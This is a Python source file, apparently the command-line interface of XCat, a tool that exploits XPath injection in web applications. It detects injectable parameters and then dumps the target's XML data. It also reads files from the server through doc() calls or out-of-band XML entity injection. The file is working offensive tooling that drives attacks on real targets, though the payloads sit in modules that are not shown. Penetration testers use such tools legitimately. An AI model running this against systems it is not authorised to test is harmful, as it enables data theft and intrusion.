"""
XCat.

Usage:
    xcat <url> <target_parameter> [<parameters>]... (--true-string=<string> | --true-code=<code>) [--method=<method>]
         [--fast] [--oob-ip=<ip> (--oob-port=<port>)] [--stats] [--concurrency=<val>]
         [--features] [--body] [--cookie=<cookie>] [(--shell | --shellcmd=<cmd>)]
    xcat detectip

Options:
    -o, --oob-ip=<ip>           Use this IP for OOB injection attacks
    -p, --oob-port=<port>       Use this port for injection attacks
    --stats                     Print statistics at the end of the session
"""
import contextlib
import functools
from typing import List, Tuple

import click
import asyncio

from xcat import algorithms
from xcat.attack import AttackContext, Encoding
from xcat.display import display_xml
from xcat.features import detect_features, Feature
from xcat.injections import detect_injections, Injection
from xcat import utils


@click.group()
def cli():
    pass


def attack_options(func):
    @click.option('-m', '--method', default='GET', show_default=True)
    @click.option('-h', '--headers', required=False, type=utils.HeaderFile())
    @click.option('-b', '--body', required=False, type=click.File('rb'))
    @click.option('-e', '--encode', default=Encoding.URL, type=utils.EnumType(Encoding))
    @click.option('-f', '--fast-mode', type=bool, default=False, show_default=True)
    @click.option('-c', '--concurrency', type=int, default=10, show_default=True)
    @click.option('-ts', '--true-string', required=False, type=utils.NegatableString(),
                  help="Interpret this string in the response body as being a truthful request. Negate with '!'")
    @click.option('-tc', '--true-code', required=False, type=utils.NegatableInt(),
                  help="Interpret this response code as being a truthful request. Negate with '!'")
    @click.option('--enable', required=False, type=utils.FeatureChoice())
    @click.option('--disable', required=False, type=utils.FeatureChoice())
    @click.argument('url')
    @click.argument('target_parameter')
    @click.argument('parameters', nargs=-1, type=utils.DictParameters())
    @click.pass_context
    @functools.wraps(func)
    def wrapper(ctx, url, target_parameter, parameters, concurrency, fast_mode, body, headers, method,
                encode, true_string, true_code, enable, disable, **kwargs):
        if body and encode != 'url':
            ctx.fail('Can only use --body with url encoding')

        if not true_code and not true_string:
            ctx.fail('--true-code or --true-string is required')

        match_function = utils.make_match_function(true_code, true_string)
        parameters = dict(parameters)

        if target_parameter not in parameters:
            ctx.fail(f'target parameter {target_parameter} is not in the given list of parameters')

        body_bytes = None
        if body:
            body_bytes = body.read()

        context = AttackContext(
            url=url,
            method=method,
            target_parameter=target_parameter,
            parameters=parameters,
            match_function=match_function,
            concurrency=concurrency,
            fast_mode=fast_mode,
            body=body_bytes,
            headers=headers,
            encoding=encode,
        )

        if enable:
            context.features.update({k: True for k in enable})

        if disable:
            context.features.update({k: False for k in disable})

        return func(context, **kwargs)

    return wrapper


@cli.command()
@attack_options
def detect(attack_context):
    payloads: List[Injection] = asyncio.run(get_injections(attack_context))

    if not payloads:
        click.echo(click.style('Error: No injections detected', 'red'), err=True)
        exit(1)

    for payload in payloads:
        click.echo(click.style(payload.name, 'green'))
        click.echo(' - Example: ' + click.style(payload.example, 'yellow'))

    features: List[Tuple[Feature, bool]] = asyncio.run(get_features(attack_context, payloads[0]))
    click.echo('Detected features:')
    for feature, available in features:
        click.echo(' - ' + click.style(feature.name, 'blue') + ': ', nl=False)
        click.echo(click.style(str(available), 'green' if available else 'red'))


@cli.command()
@attack_options
def run(attack_context):
    asyncio.run(start_attack(attack_context))


@cli.command()
@click.argument('file_path')
@attack_options
def cat(attack_context, file_path):
    data = asyncio.run(start_cat(attack_context, file_path))
    print(data)


@cli.command()
def get_ip():
    ip = utils.get_ip()
    if not ip:
        click.echo('Could not find an external IP', err=True)
    else:
        click.echo(ip)
    return


async def get_injections(context: AttackContext):
    async with context.start() as ctx:
        return await detect_injections(ctx)


async def get_features(context: AttackContext, injection: Injection):
    async with context.start() as ctx:
        return await detect_features(ctx, injection)


@contextlib.asynccontextmanager
async def setup_context(context: AttackContext) -> AttackContext:
    injections = await get_injections(context)
    if not injections:
        click.echo(click.style('Error: No injections detected', 'red'), err=True)
        exit(1)
    features = await get_features(context, injections[0])
    for feature, available in features:
        if feature.name in context.features:
            # This will have been force enable or disabled via the CLI flags
            continue
        context.features[feature.name] = available
    async with context.start(injections[0]) as ctx:
        if context.features['oob-http']:
            oob_ctx_manager = ctx.start_oob_server
        else:
            oob_ctx_manager = ctx.null_context
        async with oob_ctx_manager() as oob_ctx:
            yield oob_ctx


async def start_attack(context: AttackContext):
    async with setup_context(context) as ctx:
        await display_xml([await algorithms.get_nodes(ctx)])


async def start_cat(context: AttackContext, file_path):
    async with setup_context(context) as ctx:
        if await algorithms.doc_available(ctx, file_path):
            await display_xml([await algorithms.get_nodes(ctx, algorithms.doc(file_path) / algorithms.ROOT_NODE)])
        else:
            if not ctx.oob_app:
                click.echo(click.style('Error: OOB http not available, '
                                       'and file is either not available or not valid XML', 'red'), err=True)
                exit(1)
            contents = await algorithms.get_file_via_entity_injection(ctx, file_path)


if __name__ == '__main__':
    cli()
